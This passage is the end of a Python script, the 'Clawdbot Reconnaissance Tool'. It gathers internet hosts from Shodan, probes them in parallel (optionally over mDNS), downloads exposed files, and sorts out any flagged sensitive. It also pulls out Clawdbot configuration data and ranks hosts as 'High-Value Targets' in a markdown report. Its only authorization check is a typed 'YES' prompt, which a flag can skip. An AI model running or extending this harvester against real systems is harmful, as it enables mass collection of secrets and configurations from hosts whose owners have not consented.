            target_dir = self.output_dir / safe_ip
            target_dir.mkdir(exist_ok=True)
            
            # Save Shodan data
            with open(target_dir / "shodan_raw.json", 'w') as f:
                json.dump(result.shodan_data, f, indent=2, default=str)
            
            # Save services
            services_data = []
            for s in result.services:
                sd = asdict(s)
                sd['service_type'] = sd['service_type'].value
                services_data.append(sd)
            with open(target_dir / "services.json", 'w') as f:
                json.dump(services_data, f, indent=2)
            
            # Save summary
            summary = {
                'ip': result.ip,
                'scan_time': result.scan_time,
                'validated': result.validated,
                'services': len(result.services),
                'findings': len(result.findings),
                'sensitive': sum(1 for f in result.findings if f.is_sensitive),
                'finding_list': [
                    {
                        'path': f.path, 
                        'sensitive': f.is_sensitive, 
                        'matches': f.sensitive_matches,
                        'clawdbot_config': f.clawdbot_config
                    }
                    for f in result.findings
                ]
            }
            with open(target_dir / "summary.json", 'w') as f:
                json.dump(summary, f, indent=2)
            
            # Save findings
            if result.findings:
                findings_dir = target_dir / "findings"
                findings_dir.mkdir(exist_ok=True)
                sensitive_dir = target_dir / "SENSITIVE"
                
                for i, finding in enumerate(result.findings):
                    path_clean = finding.path.replace('/', '_').replace('.', '_')
                    if path_clean.startswith('_'):
                        path_clean = path_clean[1:]
                    filename = f"{i:03d}_{path_clean[:40]}.txt"
                    
                    content = (
                        f"# URL: {finding.url}\n"
                        f"# Path: {finding.path}\n"
                        f"# Status: {finding.status_code}\n"
                        f"# Size: {finding.content_length}\n"
                        f"# Sensitive: {finding.is_sensitive}\n"
                        f"# Matches: {', '.join(finding.sensitive_matches)}\n"
                        f"#{'='*70}\n\n"
                        f"{finding.content}"
                    )
                    
                    with open(findings_dir / filename, 'w') as f:
                        f.write(content)
                    
                    if finding.is_sensitive:
                        sensitive_dir.mkdir(exist_ok=True)
                        with open(sensitive_dir / filename, 'w') as f:
                            f.write(content)
            
            return target_dir
    
    def generate_report(self, results: List[TargetResult]) -> Path:
        report_path = self.output_dir / "MASTER_REPORT.md"
        
        total = len(results)
        validated = sum(1 for r in results if r.validated)
        with_findings = sum(1 for r in results if r.findings)
        total_findings = sum(len(r.findings) for r in results)
        sensitive = sum(sum(1 for f in r.findings if f.is_sensitive) for r in results)
        
        # Collect match types
        match_counts = {}
        for r in results:
            for f in r.findings:
                for m in f.sensitive_matches:
                    match_counts[m] = match_counts.get(m, 0) + 1
        
        with open(report_path, 'w') as f:
            f.write("# Clawdbot Reconnaissance Report v3.0\n\n")
            f.write(f"**Generated:** {datetime.now().isoformat()}\n\n")
            
            f.write("## Summary\n\n")
            f.write("| Metric | Count |\n|--------|-------|\n")
            f.write(f"| Targets Processed | {total} |\n")
            f.write(f"| Validated Clawdbot | {validated} |\n")
            f.write(f"| With Findings | {with_findings} |\n")
            f.write(f"| Total Files | {total_findings} |\n")
            f.write(f"| **Sensitive Files** | **{sensitive}** |\n\n")
            
            if match_counts:
                f.write("## Sensitive Data Types\n\n")
                f.write("| Type | Count |\n|------|-------|\n")
                for t, c in sorted(match_counts.items(), key=lambda x: -x[1]):
                    f.write(f"| `{t}` | {c} |\n")
                f.write("\n")
            
            f.write("## High-Value Targets\n\n")
            sorted_results = sorted(
                results,
                key=lambda r: sum(1 for f in r.findings if f.is_sensitive),
                reverse=True
            )
            
            for r in sorted_results[:50]:  # Top 50
                if not r.findings:
                    continue
                sens = sum(1 for f in r.findings if f.is_sensitive)
                icon = "🔴" if sens >= 3 else "🟠" if sens >= 1 else "🟡"
                
                f.write(f"### {r.ip} {icon}\n\n")
                f.write(f"- Validated: {r.validated}\n")
                f.write(f"- Findings: {len(r.findings)} ({sens} sensitive)\n\n")
                
                # Show Clawdbot config if found
                for finding in r.findings:
                    if finding.clawdbot_config:
                        f.write("**Clawdbot Config Extracted:**\n```json\n")
                        f.write(json.dumps(finding.clawdbot_config, indent=2))
                        f.write("\n```\n\n")
                        break  # Only show once per target
                
                if r.findings:
                    f.write("| Path | Sensitive | Matches |\n|------|-----------|--------|\n")
                    for finding in r.findings[:20]:
                        sens_mark = "⚠️" if finding.is_sensitive else ""
                        matches = ', '.join(finding.sensitive_matches[:3]) or "-"
                        f.write(f"| `{finding.path}` | {sens_mark} | {matches} |\n")
                    f.write("\n")
            
            f.write("\n---\n*Generated by Clawdbot Recon v3.3*\n")
        
        self.logger.info(f"Report: {report_path}")
        return report_path


# ============================================================================
# Main
# ============================================================================

def setup_logging(output_dir: Path, verbose: bool = False) -> ThreadSafeLogger:
    log_file = output_dir / "recon.log"
    
    logger = logging.getLogger("clawdbot_recon")
    logger.setLevel(logging.DEBUG)
    logger.handlers = []
    
    fh = logging.FileHandler(log_file)
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(logging.Formatter('%(asctime)s | %(levelname)-8s | %(message)s'))
    
    ch = logging.StreamHandler()
    ch.setLevel(logging.DEBUG if verbose else logging.INFO)
    ch.setFormatter(logging.Formatter('%(asctime)s | %(levelname)-8s | %(message)s', '%H:%M:%S'))
    
    logger.addHandler(fh)
    logger.addHandler(ch)
    
    return ThreadSafeLogger(logger)


def print_banner():
    print("""
    ╔══════════════════════════════════════════════════════════════════════╗
    ║       CLAWDBOT RECONNAISSANCE TOOL v3.3 - MULTITHREADED              ║
    ╠══════════════════════════════════════════════════════════════════════╣
    ║  • IMMEDIATE SAVES - Findings saved as discovered (Ctrl+C safe!)     ║
    ║  • Parallel target processing (20 workers default)                   ║
    ║  • /chat/ validation before full probe                               ║
    ║  • Clawdbot config extraction from HTML responses                    ║
    ║  • Save/Resume functionality (--resume to continue)                  ║
    ║  • Active mDNS probing on UDP 5353 (--mdns flag)                     ║
    ╠══════════════════════════════════════════════════════════════════════╣
    ║  [!] AUTHORIZED USE ONLY                                             ║
    ╚══════════════════════════════════════════════════════════════════════╝
    """)


def main():
    parser = argparse.ArgumentParser(description="Clawdbot Recon v3.3 - Immediate Saves")
    parser.add_argument('--api-key', '-k', default=os.environ.get('SHODAN_API_KEY'))
    parser.add_argument('--target', '-t', help='Direct target IP')
    parser.add_argument('--ports', '-p', default='80,443,8080,8443,18789,18790,18793')
    parser.add_argument('--query', '-q', help='Custom Shodan query')
    parser.add_argument('--limit', '-l', type=int, default=0, help='Results per query (0=unlimited)')
    parser.add_argument('--output', '-o', type=Path, default=Path('./results'))
    parser.add_argument('--workers', '-w', type=int, default=20, help='Parallel workers')
    parser.add_argument('--timeout', type=int, default=5)
    parser.add_argument('--mdns', action='store_true', help='Enable active mDNS probing on UDP 5353')
    parser.add_argument('--fast', '-f', action='store_true', help='Fast mode: Only probe Clawdbot-specific paths')
    parser.add_argument('--resume', '-r', action='store_true', help='Resume from saved state')
    parser.add_argument('--save-interval', type=int, default=10, help='Save state every N targets')
    parser.add_argument('--dry-run', action='store_true')
    parser.add_argument('--verbose', '-v', action='store_true')
    parser.add_argument('--confirm', action='store_true')
    
    args = parser.parse_args()
    
    print_banner()
    
    if not args.confirm:
        confirm = input("\n[?] Confirm authorization (YES): ")
        if confirm.strip().upper() != 'YES':
            print("[!] Aborted")
            sys.exit(1)
    
    args.output.mkdir(parents=True, exist_ok=True)
    logger = setup_logging(args.output, args.verbose)
    
    logger.info("=" * 70)
    logger.info("Clawdbot Recon v3.3 - IMMEDIATE SAVES")
    logger.info("=" * 70)
    
    if args.fast:
        logger.info("FAST MODE: Only probing Clawdbot-specific paths")
    
    results_manager = ResultsManager(args.output, logger)
    state_manager = StateManager(args.output)
    prober = MultithreadedProber(
        logger, 
        timeout=args.timeout,
        max_workers=args.workers
    )
    prober.fast_mode = args.fast  # Pass fast mode to prober
    
    all_results = []
    completed_ips = set()
    
    # Check for resume
    if args.resume:
        state_info = state_manager.get_state_info()
        if state_info:
            logger.info(f"Found saved state:")
            logger.info(f"  Targets: {state_info.get('targets_count', 0)} (saved {state_info.get('targets_saved_at', 'N/A')})")
            logger.info(f"  Progress: {state_info.get('completed', 0)} completed")
            completed_ips, _ = state_manager.load_state()
            logger.info(f"  Resuming from {len(completed_ips)} completed targets...")
        else:
            logger.info("No saved state found, starting fresh")
    
    # Direct target mode
    if args.target:
        logger.info(f"Direct target: {args.target}")
        ports = [int(p.strip()) for p in args.ports.split(',')]
        
        targets = {args.target: {'ip_str': args.target, 'port': ports[0], 'ports': ports}}
        
        if not args.dry_run:
            all_results = prober.process_targets_parallel(targets, max_workers=1)
    
    # Shodan mode
    elif args.api_key:
        logger.info("Shodan mode - UNLIMITED results")
        
        # Check if we can resume with saved targets
        raw_results = None
        if args.resume:
            raw_results = state_manager.load_targets()
            if raw_results:
                logger.info(f"Loaded {len(raw_results)} targets from saved state")
        
        # Fetch new targets if not resuming or no saved state
        if not raw_results:
            shodan_handler = ShodanHandler(args.api_key, logger)
            
            if args.query:
                raw_results = {
                    r.get('ip_str'): r 
                    for r in shodan_handler.search(args.query, limit=args.limit)
                    if r.get('ip_str')
                }
            else:
                raw_results = shodan_handler.search_clawdbot(limit_per_query=args.limit)
            
            # Save targets immediately after collection
            state_manager.save_targets(raw_results)
            logger.info(f"Saved {len(raw_results)} targets to {state_manager.targets_file}")
        
        # Active mDNS probing if enabled
        if args.mdns and not args.dry_run:
            logger.info("=" * 70)
            logger.info("Active mDNS Probing (UDP 5353) - from Nuclei template intel")
            logger.info("=" * 70)
            
            # Only probe IPs not already completed
            ips_to_probe = [ip for ip in raw_results.keys() if ip not in completed_ips]
            
            mdns_prober = MDNSProber(logger, timeout=2.0)
            mdns_results = mdns_prober.probe_parallel(ips_to_probe, max_workers=50)
            
            # Merge mDNS results into Shodan data
            for ip, mdns_data in mdns_results.items():
                if ip in raw_results:
                    raw_results[ip]['active_mdns'] = mdns_data
                    # Add discovered ports from mDNS
                    for svc_type, svc_info in mdns_data.items():
                        if 'gateway_port' in svc_info:
                            raw_results[ip].setdefault('extra_ports', []).append(int(svc_info['gateway_port']))
                        if 'bridge_port' in svc_info:
                            raw_results[ip].setdefault('extra_ports', []).append(int(svc_info['bridge_port']))
                        if 'canvas_port' in svc_info:
                            raw_results[ip].setdefault('extra_ports', []).append(int(svc_info['canvas_port']))
                else:
                    # New target discovered via mDNS!
                    raw_results[ip] = {'ip_str': ip, 'active_mdns': mdns_data, 'port': 5353}
            
            logger.info(f"mDNS enhanced targets: {len(mdns_results)}")
            
            # Update saved targets with mDNS data
            state_manager.save_targets(raw_results)
        
        # Filter out completed targets if resuming
        if completed_ips:
            original_count = len(raw_results)
            raw_results = {ip: data for ip, data in raw_results.items() if ip not in completed_ips}
            logger.info(f"Skipping {original_count - len(raw_results)} already-completed targets")
        
        if not args.dry_run:
            all_results = prober.process_targets_parallel(
                raw_results, 
                max_workers=args.workers,
                state_manager=state_manager,
                save_interval=args.save_interval,
                results_manager=results_manager  # IMMEDIATE SAVES!
            )
    
    else:
        logger.error("Specify --api-key or --target")
        sys.exit(1)
    
    # Generate final report (individual findings already saved immediately)
    if all_results and not args.dry_run:
        results_manager.generate_report(all_results)
        logger.info(f"Report generated with {len([r for r in all_results if r.findings])} targets")
    
    # Final stats
    logger.info("=" * 70)
    logger.info("COMPLETE")
    logger.info(f"  Targets: {len(all_results)}")
    logger.info(f"  Validated: {prober.stats['validated']}")
    logger.info(f"  Findings: {prober.stats['findings']}")
    logger.info(f"  Sensitive: {prober.stats['sensitive']}")
    logger.info(f"  Output: {args.output}")
    logger.info("=" * 70)


if __name__ == "__main__":
    main()
